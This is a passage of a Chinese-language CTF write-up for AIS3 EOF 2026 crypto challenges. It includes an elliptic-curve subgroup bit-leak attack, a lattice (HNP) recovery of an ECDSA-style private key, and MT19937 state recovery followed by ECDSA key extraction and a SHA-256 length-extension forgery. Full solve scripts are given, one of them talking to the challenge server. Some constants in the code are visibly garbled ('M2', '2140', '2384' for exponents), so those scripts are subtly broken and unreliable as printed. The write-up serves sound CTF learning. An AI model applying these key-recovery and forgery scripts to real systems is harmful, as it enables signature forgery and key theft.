        - $C(G_2, O_2) = P_1(\text{rand2})$   
   
        這兩個值來自不同多項式、不同隨機輸入，彼此無關。   
    - 情況二：$b = 1$   
        - $f_1 = 0$   
            
        $$
        O_1 = (P_2(\text{rand1}) + \text{uwub})G_1 + P_1(\text{meoW})G_2
        $$
        - $f_2 = 1$   
            
        $$
        O_2 = P_2(\text{meoW})G_1 + (P_1(\text{rand2}) + \text{uwub})G_2
        $$
   
        乾淨係數：   
        - $C(G_2, O_1) = P_1(\text{meoW})$   
        - $C(G_1, O_2) = P_2(\text{meoW})$   
   
        這兩個值是 在相同輸入 `meoW` 下的多項式值對。   
- 攻擊策略（Attack Strategy）   
    我們可以透過判斷：   
    
    $$
    (v1,u2)=(C(G2,O1),  C(G1,O2))
    $$
    是否屬於集合：   
    
    $$
    {(P1(x),P2(x))∣x∈Z}
    $$
    來分辨該 bit 是 0 還是 1。   
    為何可以做到？—— 小子群投影   
    直接在完整曲線上解 離散對數問題（DLP） 是不可行的。   
    但這條橢圓曲線的 order 非常 smooth，其中包含小質因數：   
    
    $$
    ∣E∣=2^{92}⋅3⋅7^2⋅13^2⋅499^2⋯
    $$
    取：   
    
    $$
    M=499
    $$
    並設：   
    
    $$
    k=∣E∣/499^2
    $$
    即可將點投影到一個階為 499 的小子群，在此子群中 DLP 可被暴力解出。   
   
攻擊流程   
- 前置計算（Precomputation）   
    - 建立合法多項式值集合：
    
    $S_{valid}={(P_1(x) mod 499,  P_2(x) mod 499)∣x=0..498}$
    - 投影基底點：   
        
    $$
    B_1=kG_1,B_2=kG_2
    $$
    - 建立 DLP 查表：   
        
    $$
    uB_1+vB2  ↦  (u,v)
    $$
    搜尋空間約 $499^2 \approx 250{,}000$   
 --- 
- 解密每一組輸出點   
    對於每一組 $(O_1, O_2)$：   
    1. 投影：   
        
    $$
    W_1=kO_1, W_2=kO_2
    $$
    2. 解 DLP，得到：   
        - $(u_1, v_1)$ for $W_1$   
        - $(u_2, v_2)$ for $W_2$   
    3. 注意：   
        - 只給 $x$ 座標，lift 時 $y$ 有正負號不確定性   
        - 需檢查 4 種符號組合   
    4. 若存在符號組合使：   
        $(v1,u2)∈S_{valid}$
        則該 bit 為 1，否則為 0   
   
```python
from sage.all import *
# --- Configuration ---
p = 258664426012969094010652733694893533536393512754914660539884262666720468348340822774968888139573360124440321458177
E = EllipticCurve(GF(p), [0, 0, 0, 0, 1])
order = E.order()
# Coefficients from chal.py (highest degree first)
c1_coeffs = [
    10413259884191656339071716260830970594019380678633640710598727433295926285347918708292004016490651932000,
    252494110674012002541514797764827158724121386633059451594119818010148193281592400026520593213461099399038944073486,
    14529160840260745786509496359724356787188326132801486485566133985535665069892295966690495950982676949536238346962,
    95515120986975418742780707357913088549131357305328369209808244591545738634309873996623254051815891755018401343856,
    65176268221379786971773925764775296541697077770744636064225970565945754418513311940786569146293497193663533010652,
    180776214508546762217902706989924469079606298223767170020347719086675964795206127649700412230279249284690008979158,
    233302413192532175819496609029797143533434993955387323269458143291245908014630929176027926621738749425901291228018,
    143491234406688723416490898601225309678343916741387556923054435686233973323559376474177051270543031936592520011397
]
c2_coeffs = [
    3471086628063885446357238753610323531339793559544546903532909144431975428449306236097334672163550644000,
    84164703558004000847171599254942386241373795544353150531373272670049397760530800008840197737820366466346314691162,
    91064528951076613265720743351539296774527279629238715675150132217418711139411039580553128030185345691325519935046,
    31838373662325139580926902452637696183043785768442789736602748197181912878103291332207751350605297251672800447952,
    21725422740459928990591308588258432180565692590248212021408656855315251472837770646928856382097832397887844336884,
    232701688844828316746402724793237178717464441244532163700038748140038967163962591066546062836475323177856883965170,
    250210421739490121280267358806528070202074006488405548116408889541562281570437524908655234300295156558260644714790,
    220273362144208970479265455330337458917043647417072292667607653673224970006747007341371609183229917395181118430820
]
mmEow_x = 0x15f7e91de69ddf5a4b6969c8c9692882270a9e6fcbd1f29b92f8a1d5b5794e2b8828eccbc0cc1c01ce32400cb59f390
mmEoW_x = 0xeaa67267449d5e06eebdbeed61c86bcf2a50e14dc7747f51fc14798b693b4036fa929f99b25e3b31993b9b781c5809
# --- Precomputation ---
M = 499
R_M = PolynomialRing(Zmod(M), 'x')
# Reverse coefficient lists for Sage (low to high)
poly1 = R_M(list(reversed(c1_coeffs)))
poly2 = R_M(list(reversed(c2_coeffs)))
print("Computing valid pairs...")
valid_pairs = set()
for x in range(M):
    valid_pairs.add((poly1(x), poly2(x)))
print("Lifting base points...")
G1 = E.lift_x(Integer(mmEow_x))
G2 = E.lift_x(Integer(mmEoW_x))
# Project to subgroup
cofactor = order // (M2)
B1 = cofactor * G1
B2 = cofactor * G2
print("Building DLP table...")
dlp = {}
# Small search space: 499 * 499 ~ 250k
for u in range(M):
    uB1 = u * B1
    for v in range(M):
        pt = uB1 + v * B2
        dlp[pt] = (u, v)
# --- Solving ---
def get_coeffs(W):
    if W in dlp: return dlp[W]
    if -W in dlp:
        u, v = dlp[-W]
        return ((-u) % M, (-v) % M)
    return None, None
recovered_bits = []
print("Parsing output...")
with open('output.txt', 'r') as f:
    lines = f.readlines()
line_idx = 0
while line_idx < len(lines):
    line = lines[line_idx].strip()
    if line.startswith("MeeOw MeeOw >"):
        p1_hex = lines[line_idx+1].strip()
        p2_hex = lines[line_idx+3].strip()
        line_idx += 4
        x1 = Integer(int(p1_hex, 16))
        x2 = Integer(int(p2_hex, 16))
        # Lift and Project
        try:
            O1 = E.lift_x(x1)
            O2 = E.lift_x(x2)
        except ValueError:
            recovered_bits.append(0)
            continue
        W1 = cofactor * O1
        W2 = cofactor * O2
        u1, v1 = get_coeffs(W1)
        u2, v2 = get_coeffs(W2)
        if u1 is None or u2 is None:
            recovered_bits.append(0)
            continue
        # Correlated components: v1 (coeff of G2 in O1) and u2 (coeff of G1 in O2)
        # Check all sign permutations because x-lifting is ambiguous
        is_one = False
        candidates = [
            (v1, u2), 
            ((-v1) % M, u2), 
            (v1, (-u2) % M), 
            ((-v1) % M, (-u2) % M)
        ]
        for cand in candidates:
            if cand in valid_pairs:
                is_one = True
                break
        recovered_bits.append(1 if is_one else 0)
    else:
        line_idx += 1
# --- Reconstruction ---
flag_bytes = []
for k in range(0, len(recovered_bits), 8):
    chunk = recovered_bits[k:k+8]
    if len(chunk) < 8: break
    val = 0
    for b in chunk:
        val = (val << 1) | b
    flag_bytes.append(val)
print("Recovered Flag:")
# Decode UTF-8 explicitly to handle emojis
print(bytes(flag_bytes).decode('utf-8', errors='replace'))
```

### Still Not Random   

![image](/images/ais3-eof-2026-qual/image_1b.png)    
flag: `EOF{just_some_small_bruteforce_after_LLL}`
     
題目給了`chall.py`，實作了一個自製的 ECDSA 簽章 oracle，並使用私鑰 `sk` 來加密 flag。加密金鑰是由私鑰 `sk` 推導而來。我們已知：   
- 共提供 4 組 ECDSA 簽章   
- 對應 4 個已知訊息（YouTube URLs）   
   
漏洞分析如下：   
- Nonce 產生方式的問題   
    核心漏洞出現在 deterministic nonce（k）生成函式：   
    ```python
    def sign(sk: int, msg: bytes, *, curve=P384, hashfunc=sha256) -> tuple[int, int]:
        key = hashfunc(str(sk).encode()).digest()
        k = int.from_bytes(key + hmac.new(key, msg, hashfunc).digest()) % curve.q
        # ... standard ECDSA ...
    
    ```
    分析這段程式碼：   
    - `key = sha256(str(sk))`   
        → 對於固定的 `sk`， `key` 是常數   
    - `k` 是由以下方式組成：   
        - 前 32 bytes： `key`   
        - 後 32 bytes： `HMAC(key, msg)`   
    - 因此：   
        ```python
        k_raw = (key << 256) + hmac_value
        ```
- 位元長度與模數的關係   
    - 使用的曲線為 P-384   
    - 曲線階數    
    
    $$
    q ≈ 2^{384}
    $$
    - `k_raw` 為 512 bits   
    - 實際使用的 nonce 為：
`k = k_raw mod q`   
    - 由於 modulo 運算，乍看之下高位資訊似乎被 wrap 而無法利用。   
- 關鍵觀察：Nonce 差值是「小的」   
    考慮兩個不同訊息 $m_1, m_2$ 所產生的 nonce：   
    
    $$
    k_1 = (\text{key} \cdot 2^{256} + \text{hmac}_1) \bmod q
    $$
    
    $$
    k_2 = (\text{key} \cdot 2^{256} + \text{hmac}_2) \bmod q
    $$
    
    計算差值：   
    
    $$
    k_1 - k_2 \equiv (\text{hmac}_1 - \text{hmac}_2) \pmod q
    $$
    因為：   
    - `hmac` 為 256 bits   
    - 所以：   
        
    $$
    |\text{hmac}_1 - \text{hmac}_2| < 2^{256}
    $$
    - 而：   
        
    $$
    q \approx 2^{384}
    $$
   
    因此在模 $q$ 的意義下：   
    
    $$
    |k_i - k_j|_q < 2^{256}
    $$
    Nonce 差值異常地小   
    為 Hidden Number Problem（HNP） 的典型特徵   
- 攻擊策略（Attack Strategy）   
    - 建立 Hidden Number Problem（HNP）   
        一般 ECDSA 簽章方程式為：   
        
        $$
        s = k^{-1}(z + r \cdot sk) \pmod q
        $$
        但本題使用的簽章方式是：   
        
        $$
        s = (k + sk * e) \% curve.q
        $$
        因此可得：   
        $$
        k \equiv s - sk \cdot e \pmod q
        $$
        對於兩組簽章 $i, j$：   
        $$
        k_i - k_j \equiv (s_i - s_j) - sk(e_i - e_j) \pmod q
        $$
        定義：   
        - $\Delta k = k_i - k_j$   
        - $\Delta s = s_i - s_j$   
        - $\Delta e = e_i - e_j$   
   
        得到：   
        
        $$
        \Delta k = \Delta s - sk \cdot \Delta e \pmod q
        $$
        且我們已知：   
        
        $$
        |\Delta k| < 2^{256}
        $$
        這個「小誤差」條件，使得我們可以透過 格攻擊（lattice reduction） 來解出 `sk`。   
    - Lattice 建構方式   
        我們有 4 組簽章，因此可以建立 3 組獨立差分方程式。   
        使用標準 embedding 技巧，建立以下 lattice：   
        
        $$
        \begin{pmatrix}
        qW & 0 & 0 & 0 & 0 \\
        0 & qW & 0 & 0 & 0 \\
        0 & 0 & qW & 0 & 0 \\
        \Delta e_0 W & \Delta e_1 W & \Delta e_2 W & 1 & 0 \\
        -\Delta s_0 W & -\Delta s_1 W & -\Delta s_2 W & 0 & K
        \end{pmatrix}
        $$
        其中：   
        - $W$：大型權重（如 $2^{128}$），用來強化模數約束   
        - $K$：常數項的縮放因子   
   
        期望找到的短向量約為：   
        
        $$
        (W\Delta k_0,\; W\Delta k_1,\; W\Delta k_2,\; sk,\; K)
        $$
        因為 $\Delta k$ 很小，前 3 個分量會顯著小於 $qW$，   
        因此 LLL / BKZ 可以將該向量還原出來。   
    - 使用 SageMath 求解   
        實作流程如下：   
        1. 根據題目程式碼，還原每一筆簽章對應的 $e_i$   
        2. 計算：   
            - $\Delta s_i$   
            - $\Delta e_i$   
        3. 建立 lattice matrix   
        4. 使用 BKZ（block size = 20） 進行化簡   
        5. 枚舉化簡後基底的線性組合，找出：   
            - 最後一個分量為 $K$ 或 $-K$ 的向量   
            - 該向量的第 4 個分量即為候選私鑰 `sk`   
    - 解密 Flag   
        Flag 使用 AES-CTR 加密，金鑰由私鑰低 128 bits 推導：   
        ```markdown
        key = (sk & ((1 << 128) - 1)).to_bytes(16)
        ```
        對每個候選 `sk`：   
        1. 推導 AES key   
        2. 嘗試解密   
        3. 成功解密即得到正確 flag   
   
solve script 如下   
```python
import hmac
from hashlib import sha256
from Crypto.Cipher import AES
import itertools
# --- Constants & Configuration ---
p = 39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319
a = -3
b = 0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef
q = 39402006196394479212279040100143613805079739270465446667946905279627659399113263569398956308152294913554433653942643
E = EllipticCurve(GF(p), [a, b])
msgs = [
    b"https://www.youtube.com/watch?v=LaX6EIkk_pQ",
    b"https://www.youtube.com/watch?v=wK4wA0aKvg8",
    b"https://www.youtube.com/watch?v=iq90nHs3Gbs",
    b"https://www.youtube.com/watch?v=zTKADhU__sw",
]
sigs = [ (317707421133410288073354603009480426136391906002873302709570879761947103070512898051132583840618463139472027601216698251294206460344755339051109898589809987983731707077909099505833365567522347006453766545663380230105595126817790425, 25185752159924706126981435669717936861361993674900106138337831137838509453749313533989197233649309651483579988978205),   (417548456675579988606680466439690234874946492911623920447331037240230655879606626325624623314611471522814787475988129078726743347417903386362824681134780863810523742180718053363084828145812067731683272119151061828749117659255650820, 27618563118772187320593702066291845973666620541831283288991142064228070314197536489147588491763843793593821643513457),    (703771273054730080235579285501232710659154148145979519264450072512823561624248636822569827736905476306443746390214567198923437156846958456303186787370323078966806939434118158768394748234214487029382926999880135374613932395712372460, 27052092405825396792237011211691900251888872753276208811631357208317438773416505653305767076226992282260977625878007),    (821717323558426535455119744526279609022144869806906586662554363968363839151910768914318502227461974453838258550953434850776924606792184210954238562503515009237179979646111655773804054528212491391076376250546737439142144165942539844, 28870411728276849847003745583242490365442899058004875752358198407125701328587711166784961247940279464305857022011977)
]
ct_bytes = b'iXm\x982\xc5\xf23\x85\x88\x91\x0c\x7f\xdc\x1b,\x1b\x82\x9d\xcd\x00 BWn\xad\n\xc3`\xe7\x8e\xfc`%\x9cQ\x12E\x97\x97\xa5\xd5t\x8b\x87v\xb4\xcf\x8d'
nonce = ct_bytes[:8]
ciphertext = ct_bytes[8:]
print("[*] Starting attack on Still Not Random...")
# --- Step 1: Recover message hashes (e) ---
es = []
ss = []
for i, (r_val, s_val) in enumerate(sigs):
    msg = msgs[i]
    r_bytes = r_val.to_bytes(1337, byteorder='big')
    e = int.from_bytes(hmac.new(r_bytes, msg, sha256).digest(), byteorder='big') % q
    es.append(e)
    ss.append(s_val)
print(f"[*] Recovered {len(es)} message hashes.")
# --- Step 2: Formulate Hidden Number Problem ---
diff_s = []
diff_e = []
for i in range(3):
    diff_s.append((ss[i] - ss[i+1]) % q)
    diff_e.append((es[i] - es[i+1]) % q)
W = 2140
K_const = 2384
M_size = 5
M = Matrix(ZZ, M_size, M_size)
for i in range(3):
    M[i, i] = q * W
for i in range(3):
    M[3, i] = diff_e[i] * W
M[3, 3] = 1
M[3, 4] = 0
for i in range(3):
    M[4, i] = -diff_s[i] * W
M[4, 3] = 0
M[4, 4] = K_const
print("[*] Running Lattice Reduction (BKZ)...")
L = M.BKZ(block_size=20)
# --- Step 3: Search for Candidate Private Keys ---
print("[*] Searching for candidates from lattice basis...")
candidates = set()
basis = [row for row in L]
dim = len(basis)
r = 3
coeffs_range = range(-r, r+1)
for coeffs in itertools.product(coeffs_range, repeat=dim):
    last_comp = sum(coeffs[i] * basis[i][4] for i in range(dim))
    if abs(last_comp) == K_const:
        sign = 1 if last_comp == K_const else -1
        sk_comp = sum(coeffs[i] * basis[i][3] for i in range(dim))
        sk_cand = (sk_comp * sign) % q
        candidates.add(sk_cand)
        candidates.add((sk_cand + 1) % q)
        candidates.add((sk_cand - 1) % q)
print(f"[*] Found {len(candidates)} unique candidates. Attempting decryption...")
# --- Step 4: Verify and Decrypt ---
flag_found = False
for sk in candidates:
    to_try = [sk]
    for val in to_try:
        try:
            aes_key = (val & ((1 << 128) - 1)).to_bytes(16, 'big')
            cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
            pt = cipher.decrypt(ciphertext)
            if b'EOF{' in pt:
                print("\n[+] Success! Flag found:")
                print(pt.decode())
                print(f"[+] Private Key (sk): {val}")
                flag_found = True
                break
        except Exception:
            continue
    if flag_found:
        break
if not flag_found:
    print("[-] Failed to decrypt. Try increasing search radius or block size.")  
```
![image](/images/ais3-eof-2026-qual/image_t.png) 

### dogdog's Proof   

![image](/images/ais3-eof-2026-qual/image_6.png)    
flag: `EOF{once_a_wise_dog_said_:_hi_._but_he_didn't_know_why_:D}` 

這個 service 提供三個功能   
1. wowoof   
    - 取得一張「ticket」，其內容會洩漏   
        ```markdown
        getrandbits(134) ^ getrandbits(134)
        ```
2. wowooF   
    - 使用 ECDSA（P-256） 對我們提供的訊息進行簽章   
    - Nonce `k` 是透過 `getrandbits(255)` 產生   
3. wowoOf   
    - 驗證一組訊息與簽章   
    - 若簽章有效，且訊息中包含字串   
        ```markdown
        i_am_the_king_of_the_dog
        ```
        即可取得 flag   
   
另外，實際被簽章的雜湊值為：   
```markdown
z = sha256(salt + message)
```
其中 `salt` 是 64 bytes 的隨機值，且對使用者未知。   
- 漏洞分析（Vulnerabilities）   
    - MT19937 狀態洩漏（State Leak）   
        `wowoof` 功能會輸出：   
        ```markdown
        WooFf wOOF {leak}'f 🐕!
        ```
        其中：   
        ```markdown
        leak = getrandbits(134) ^ getrandbits(134)
        ```
        分析要點：   
        - `getrandbits` 的輸出是由 MT19937 的 tempered output 組成   
        - MT19937 的 tempering 函式在 GF(2) 上是線性的   
        - 因此：   
            - 我們可以對 leak 進行 untemper   
            - 得到內部狀態 bits 的線性關係   
        只要蒐集足夠多的 leak，就能恢復 MT19937 的完整內部狀態：   
        - MT19937 state size：19968 bits   
        - 每個 leak 提供一組線性方程式   
- ECDSA Nonce 可預測（Nonce Prediction）   
    伺服器使用：   
    ```markdown
    getrandbits(255)
    ```
    來生成 ECDSA nonce `k`。   
    一旦我們：   
    - 成功還原 MT19937 的內部狀態   
    - 並與本地的 PRNG 同步   
    就可以精確預測之後產生的 `k`。   
- ECDSA 數學關係   
    ECDSA 簽章公式：   
    $$
    s = k^{-1}(z + r \cdot d) \pmod n
    $$
    可改寫為：   
    $$
    s \cdot k - z = r \cdot d \pmod n
    $$
    若對同一個訊息（相同 $z$）取得兩組簽章：   
    - $(r_1, s_1)$ 使用 $k_1$   
    - $(r_2, s_2)$ 使用 $k_2$   
    則有：   
    $$
    s_1 k_1 - r_1 d = z
    $$
    $$
    s_2 k_2 - r_2 d = z
    $$
    相減後消去 $z$：   
    $$
    s_1 k_1 - s_2 k_2 = d (r_1 - r_2)
    $$
    因此可解出私鑰：   
    
    $$
    d = (s_1 k_1 - s_2 k_2) \cdot (r_1 - r_2)^{-1} \pmod n
    $$
    成功還原 ECDSA 私鑰 `d`，即可偽造任意簽章。   
- Hash Length Extension Attack（LEA）   
    驗證條件要求訊息中必須包含：   
    ```markdown
    i_am_the_king_of_the_dog
    ```
    而雜湊計算方式為：   
    ```markdown
    z = sha256(salt + message)
    ```
    問題在於：   
    - `salt` 長度固定為 64 bytes   
    - SHA-256 屬於 Merkle–Damgård 結構   
    - 若我們已知：   
        - `hash(m)`   
        - `len(m)`   
   
    就可以計算：   
    ```markdown
    hash(m || padding || suffix)
    ```
    而不需要知道 `m` 本身。   
   
利用流程   
1. MT19937 狀態還原   
    - 與伺服器互動，蒐集 200 筆 leak   
    - 每一筆 leak：   
        ```markdown
        L = V1 ^ V2
        ```
        其中 $V_1, V_2$ 為 134-bit 的 MT 輸出   
    - 對 `L` 進行 untemper，得到：   
        ```markdown
        MT[i] ^ MT[i+5]
        ```
    - 建立 GF(2) 上的線性方程組：   
        - 約 25600 條方程   
        - 19968 個變數   
    - 使用自製的 Gaussian Elimination：   
        - 以 Python 大整數作為 bitset   
        - Z3 / SageMath 嘗試後皆因太慢或 OOM 而失敗   
2. 私鑰恢復   
    - 使用還原的 MT19937 狀態同步本地 `random.Random()`   
    - 關鍵細節：   
        - 將 state index 設為 0   
        - 確保與伺服器下一次 twist / generation 完全對齊   
    - 對訊息 `"A"` 請求兩次簽章   
    - 預測對應的 $k_1, k_2$   
    - 套用公式計算私鑰 $d$   
3. 偽造簽章   
    1. 計算訊息 `"A"` 的 $z$   
    2. 從 $z$ 還原 SHA-256 內部狀態   
    3. 執行 Length Extension：   
        - 加上 padding   
        - 加上 `"i_am_the_king_of_the_dog"`   
    4. 得到新雜湊 $z'$   
    5. 使用私鑰 $d$ 與任意 $k$ 對 $z'$ 簽章   
    6. 提交：   
        - 延展後的訊息   
        - 偽造的簽章   
   
solve script   
```python
import socket
import sys
import time
import re
import struct
HOST = 'chals1.eof.ais3.org'
PORT = 19081
class SHA256:
    _K = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    ]
    def __init__(self):
        self._h = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]
        self._message = b''
        self._message_len = 0 
    def _rotr(self, x, n): return ((x >> n) | (x << (32 - n))) & 0xffffffff
    def _sha256_process(self, chunk):
        w = [0] * 64
        w[0:16] = struct.unpack('!16L', chunk)
        for i in range(16, 64):
            s0 = self._rotr(w[i-15], 7) ^ self._rotr(w[i-15], 18) ^ (w[i-15] >> 3)
            s1 = self._rotr(w[i-2], 17) ^ self._rotr(w[i-2], 19) ^ (w[i-2] >> 10)
            w[i] = (w[i-16] + s0 + w[i-7] + s1) & 0xffffffff
        a, b, c, d, e, f, g, h = self._h
        for i in range(64):
            s1 = self._rotr(e, 6) ^ self._rotr(e, 11) ^ self._rotr(e, 25)
            ch = (e & f) ^ ((~e) & g)
            temp1 = (h + s1 + ch + self._K[i] + w[i]) & 0xffffffff
            s0 = self._rotr(a, 2) ^ self._rotr(a, 13) ^ self._rotr(a, 22)
            maj = (a & b) ^ (a & c) ^ (b & c)
            temp2 = (s0 + maj) & 0xffffffff
            h, g, f, e = g, f, e, (d + temp1) & 0xffffffff
            d, c, b, a = c, b, a, (temp1 + temp2) & 0xffffffff
        self._h = [(x + y) & 0xffffffff for x, y in zip(self._h, [a, b, c, d, e, f, g, h])]
    def update(self, m):
        self._message += m
        self._message_len += len(m)
        while len(self._message) >= 64: self._sha256_process(self._message[:64]); self._message = self._message[64:]
    def padding(self, message_len_bytes):
        rem = (message_len_bytes + 1 + 8) % 64
        k = (64 - rem) % 64
        return b'\x80' + b'\x00' * k + struct.pack('!Q', message_len_bytes * 8)
    def digest(self):
        final_message = self._message + self.padding(self._message_len)
        for i in range(0, len(final_message), 64): self._sha256_process(final_message[i:i+64])
        return b''.join(struct.pack('!L', x) for x in self._h)
    def hexdigest(self): return self.digest().hex()
    def restore_state(self, h_tuple, count_bytes): self._h = list(h_tuple); self._message_len = count_bytes; self._message = b''
P = 115792089210356248762697446949407573530086143415290314195533631308867097853951
N = 115792089210356248762697446949407573529996955224135760342422259061068512044369
A = -3
def inverse(a, n): return pow(a, n-2, n)
class Connection:
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        self.recv_until(b'option > ')
    def recv_until(self, target):
        buf = b''
        while target not in buf:
            chunk = self.s.recv(1024)
            if not chunk: break
            buf += chunk
            print(chunk.decode(errors='ignore'), end='', flush=True) # DEBUG
        return buf
    def sendline(self, data): self.s.sendall(data.encode() + b'\n')
    def recvline(self):
        buf = b''
        while b'\n' not in buf:
            chunk = self.s.recv(1)
            if not chunk: break
            buf += chunk
        return buf
    def interact_get_leak(self):
        self.sendline("wowoof")
        line = self.recvline()
        if b"WooFf wOOF " in line:
             m = re.search(r'wOOF (\d+)\'f', line.decode())
             if m:
                 val = int(m.group(1))
                 self.recv_until(b'option > ')
                 return val
        return None
    def interact_get_signature(self, msg_hex):
        self.sendline("wowooF")
        self.recv_until(b'(WooOfFfFfF FF) > ')
        self.sendline(msg_hex)
        line1 = self.recvline(); line2 = self.recvline()
        r = int(line1.decode().split(": ")[1].strip(), 16)
        s = int(line2.decode().split(": ")[1].strip(), 16)
        self.recv_until(b'option > ')
        return r, s
    def interact_solve(self, r, s, msg_hex):
        self.sendline("wowoOf"); self.recv_until(b'wwwooOf > '); self.sendline(hex(r))
        self.recv_until(b'wwWooOf > '); self.sendline(hex(s))
        self.recv_until(b'> '); self.sendline(msg_hex)
        while True:
            chunk = self.s.recv(4096)
            if not chunk: break
            print(chunk.decode(errors='ignore'), end='', flush=True)
N_STATE = 624
BITS = 32
VARS = N_STATE * BITS
class SymWord:
    def __init__(self, masks=None):
        if masks is None:
            self.masks = [0] * 32
        else:
            self.masks = masks
    def __xor__(self, other):
        return SymWord([a ^ b for a, b in zip(self.masks, other.masks)])
    def __rshift__(self, n):
        # Shift bits right. New bits are 0.
        new_masks = self.masks[n:] + [0]*n
        return SymWord(new_masks)
    def __lshift__(self, n):
        new_masks = [0]*n + self.masks[:-n]
        return SymWord(new_masks)
    def __and__(self, mask_int):
        new_masks = []
        for i in range(32):
            if (mask_int >> i) & 1:
                new_masks.append(self.masks[i])
            else:
                new_masks.append(0)
        return SymWord(new_masks)
def solve_mt19937_bitset():
    conn = Connection(HOST, PORT)
    print("Collecting 200 leaks...")
    leaks = []
    for i in range(200):
        leaks.append(conn.interact_get_leak())
        print(f"\r{i+1}", end='')
    print("\nExpected equations: ~25600. Vars: 19968.")
    print("Building equations...")
    state_words = []
    for i in range(N_STATE):
        w_masks = []
        for b in range(BITS):
            w_masks.append(1 << (i * BITS + b))
        state_words.append(SymWord(w_masks))
    def get_sym(idx):
        while idx >= len(state_words):
            kk = len(state_words) - 624
            y_msb = state_words[kk] & 0x80000000
            y_lsb = state_words[kk+1] & 0x7fffffff
            y = y_msb ^ y_lsb
            shift = y >> 1
            lsb_mask = y.masks[0]
            C = 0x9908b0df
            mag_masks = []
            for b_idx in range(32):
                if (C >> b_idx) & 1:
                    mag_masks.append(lsb_mask)
                else:
                    mag_masks.append(0)
            mag = SymWord(mag_masks)
            new_val = state_words[kk+397] ^ shift ^ mag
            state_words.append(new_val)
        return state_words[idx]
    def untemper(y):
        y ^= (y >> 18)
        x = y
        for _ in range(4): x = y ^ ((x << 15) & 0xefc60000)
        y = x
        x = y
        for _ in range(5): x = y ^ ((x << 7) & 0x9d2c5680)
        y = x
        x = y
        for _ in range(3): x = y ^ (x >> 11)
        y = x
        return y
    matrix_rows = []
    for i, leak in enumerate(leaks):
        if i % 50 == 0: print(f"Processing leak {i}...")
        idx = i * 10
        chunks = [leak & 0xffffffff, (leak >> 32) & 0xffffffff, (leak>>64) & 0xffffffff, (leak>>96) & 0xffffffff]
        vals = [untemper(c) for c in chunks]
        for j in range(4):
            val = vals[j]
            sym = get_sym(idx + j) ^ get_sym(idx + j + 5)
            for b in range(32):
                mask = sym.masks[b]
                bit_val = (val >> b) & 1
                if mask != 0:
                    matrix_rows.append((mask, bit_val))
    print(f"Equations generated: {len(matrix_rows)}. Solving Gaussian Elim...")
    pivots = {}
    solution = [0] * VARS
    processed_count = 0
    start_t = time.time()
    for mask, val in matrix_rows:
        processed_count += 1
        if processed_count % 1000 == 0: print(f"\rReducing {processed_count}/{len(matrix_rows)}... Pivots: {len(pivots)}", end='')
        while mask != 0:
            lsb = mask & -mask
            if lsb in pivots:
                p_mask, p_val = pivots[lsb]
                mask ^= p_mask
                val ^= p_val
            else:
                pivots[lsb] = (mask, val)
                break
    print(f"\nReduction done. Pivots: {len(pivots)}")
    res = [0] * VARS
    sorted_pivot_keys = sorted(pivots.keys(), reverse=True)
    for p in sorted_pivot_keys:
        p_mask, p_val = pivots[p]
        row_cur = 0
        temp = p_mask ^ p
        while temp:
            bit = temp & -temp
            idx = bit.bit_length() - 1
            if res[idx]: row_cur ^= 1
            temp ^= bit
        var_idx = p.bit_length() - 1
        res[var_idx] = p_val ^ row_cur
    state_ints = []
    for i in range(N_STATE):
        w = 0
        for b in range(BITS):
            if res[i * BITS + b]:
                w |= (1 << b)
        state_ints.append(w)
    print("State recovered.")
    import random
    rng = random.Random()
    rng.setstate((3, tuple(state_ints + [0]), None))
    for _ in range(200): rng.getrandbits(134); rng.getrandbits(134)
    print("Exploiting...")
    msg_hex = b'A'.hex()
    r1, s1 = conn.interact_get_signature(msg_hex)
    k1 = rng.getrandbits(255)
    r2, s2 = conn.interact_get_signature(msg_hex)
    k2 = rng.getrandbits(255)
    val_num = (s1 * k1 - s2 * k2) % N
    val_den = (r1 - r2) % N
    d = (val_num * inverse(val_den, N)) % N
    print(f"d: {hex(d)}")
    z = (s1 * k1 - r1 * d) % N
    sha = SHA256()
    z_bytes = z.to_bytes(32, 'big')
    h = struct.unpack('!8L', z_bytes)
    sha.restore_state(h, 128)
    glue = sha.padding(65)
    suffix = b"i_am_the_king_of_the_dog"
    sha.update(suffix)
    new_z = int(sha.hexdigest(), 16)
    k_forge = 12345
    Gx = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296
    Gy = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5
    def point_mul(k, x, y):
        rx, ry = None, None
        bx, by = x, y
        while k:
            if k & 1:
                if rx is None: rx, ry = bx, by
                else:
                    if rx != bx:
                        lam = ((ry - by) * inverse(rx - bx, P)) % P
                    else:
                        lam = ((3*bx*bx + A) * inverse(2*by, P)) % P
                    rx_new = (lam*lam - rx - bx) % P
                    ry = (lam*(rx - rx_new) - ry) % P
                    rx = rx_new
            if bx == 0 and by == 0: break
